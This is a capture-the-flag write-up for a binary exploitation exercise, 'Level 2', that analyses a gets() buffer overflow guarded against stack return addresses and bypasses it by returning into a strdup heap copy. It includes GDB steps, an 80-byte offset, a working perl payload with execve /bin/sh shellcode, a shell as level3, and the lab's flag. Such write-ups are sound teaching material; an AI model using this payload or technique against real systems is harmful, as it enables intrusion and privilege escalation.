# Level 2

## Connect to the virtual machine with SSH

Use the flag from `level1` as the `level2` password:

```bash
ssh level2@127.0.0.1 -p 2223
```

## Copy the binary to the host machine

From the root of this repository on the host:

```bash
scp -P 2223 level2@127.0.0.1:/home/user/level2/level2 ./level2/
```

The extracted binary is saved as `level2/level2`.

## Copy the GDB dump to the host

Inside the VM, connected as `level2`, open the binary with GDB:

```bash
gdb ./level2
```

Then enter:

```gdb
set disassembly-flavor intel
set pagination off
set logging file /tmp/level2_main_dump_gdb
set logging overwrite on
set logging on
disas main
disas p
set logging off
quit
```

Then copy the dump back from the host:

```bash
scp -P 2223 level2@127.0.0.1:/tmp/level2_main_dump_gdb ./level2/
```

Since the binary is already on the host, the same dump can also be generated
locally:

```bash
gdb -q -batch \
  -ex "set disassembly-flavor intel" \
  -ex "disassemble main" \
  -ex "disassemble p" \
  ./level2/level2 > ./level2/level2_main_dump_gdb
```

## Analyze the GDB dump

`main` only calls `p`:

```asm
0x0804853f <+0>:  push   ebp
0x08048540 <+1>:  mov    ebp,esp
0x08048542 <+3>:  and    esp,0xfffffff0
0x08048545 <+6>:  call   0x80484d4 <p>
0x0804854a <+11>: leave
0x0804854b <+12>: ret
```

The vulnerability is in `p`:

```asm
0x080484d4 <+0>:   push   ebp
0x080484d5 <+1>:   mov    ebp,esp
0x080484d7 <+3>:   sub    esp,0x68
...
0x080484e7 <+19>:  lea    eax,[ebp-0x4c]
0x080484ea <+22>:  mov    DWORD PTR [esp],eax
0x080484ed <+25>:  call   0x80483c0 <gets@plt>
```

`gets` writes into the buffer at `ebp - 0x4c` without checking its size, so we
can overwrite the saved return address.

The function also checks the saved return address before returning:

```asm
0x080484f2 <+30>:  mov    eax,DWORD PTR [ebp+0x4]
0x080484fb <+39>:  and    eax,0xb0000000
0x08048500 <+44>:  cmp    eax,0xb0000000
0x08048505 <+49>:  jne    0x8048527 <p+83>
```

This rejects return addresses beginning with `0xb`, which blocks a direct
return into the stack.

After the check, the function prints the input and copies it with `strdup`:

```asm
0x08048527 <+83>:  lea    eax,[ebp-0x4c]
0x0804852d <+89>:  call   0x80483f0 <puts@plt>
0x08048532 <+94>:  lea    eax,[ebp-0x4c]
0x08048538 <+100>: call   0x80483e0 <strdup@plt>
0x0804853d <+105>: leave
0x0804853e <+106>: ret
```

So the exploit stores shellcode in the input, lets `strdup` copy that input to
the heap, then returns to the heap copy. Heap addresses start with `0x08`, not
`0xb`, so they pass the filter.

## Find the exact offset

The saved return address is at `ebp + 4`. The input buffer starts at
`ebp - 0x4c`. Ask GDB for the exact distance after `gets` returns:

```gdb
break *p+30
run
p/x $ebp+4
p/x $ebp-0x4c
p/d ($ebp+4)-($ebp-0x4c)
```

Enter a short test input when `gets` waits for input.

Result:

```text
Breakpoint 1, 0x080484f2 in p ()
$1 = 0xbffffc2c
$2 = 0xbffffbdc
$3 = 80
```

So:

```text
saved return address slot - buffer start = 0xbffffc2c - 0xbffffbdc = 80
```

The first 80 bytes are padding. The next 4 bytes overwrite the saved return
address.

## Find the heap address

We need a return address that does not start with `0xb`, because the program
blocks stack addresses. The useful address is the heap copy created by
`strdup`.

In the dump, this is the relevant part:

```asm
0x08048532 <+94>:  lea    eax,[ebp-0x4c]
0x08048535 <+97>:  mov    DWORD PTR [esp],eax
0x08048538 <+100>: call   0x80483e0 <strdup@plt>
0x0804853d <+105>: leave
0x0804853e <+106>: ret
```

Just before the call, the program puts the address of our stack buffer in
`[esp]`, which is the first argument to `strdup`.

So this is equivalent to:

```c
strdup(buffer);
```

`strdup` allocates a new buffer on the heap, copies our input into it, and
returns the address of that heap copy.

On 32-bit x86, a function return value is stored in `eax`. Therefore, right
after `strdup` returns, `eax` contains the heap address we need.

Break just after `strdup` returns, at `p+105`:

```gdb
break *p+105
run
p/x $eax
```

Enter a short test input when `gets` waits for input.

Result:

```text
Breakpoint 1, 0x0804853d in p ()
$1 = 0x804a008
```

So the copied input starts at:

```text
0x0804a008
```

This address is valid for the exploit because:

```text
0x0804a008 starts with 0x08, so it passes the anti-stack check
0xbffffbdc starts with 0xb, so a direct stack return would be rejected
```

Because ASLR is disabled in the VM, the heap address is stable between runs.
That is why the payload overwrites the saved return address with `0x0804a008`.

## Exploitation

Payload layout:

```text
[shellcode][padding until 80 bytes][heap address]
```

The shellcode is 21 bytes, so the padding is:

```text
80 - 21 = 59
```

The heap address is:

```text
0x0804a008
```

Written in little endian:

```text
\x08\xa0\x04\x08
```

Run this in the VM:

```bash
(perl -e 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" . "A" x 59 . "\x08\xa0\x04\x08" . "\n"'; cat) | /home/user/level2/level2
```

The `cat` keeps stdin open for the shell after the process returns into the
heap shellcode.

Check the effective identity:

```bash
whoami
```

Result:

```text
level3
```

Read the next password:

```bash
cat /home/user/level3/.pass
```

## Flag

```text
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
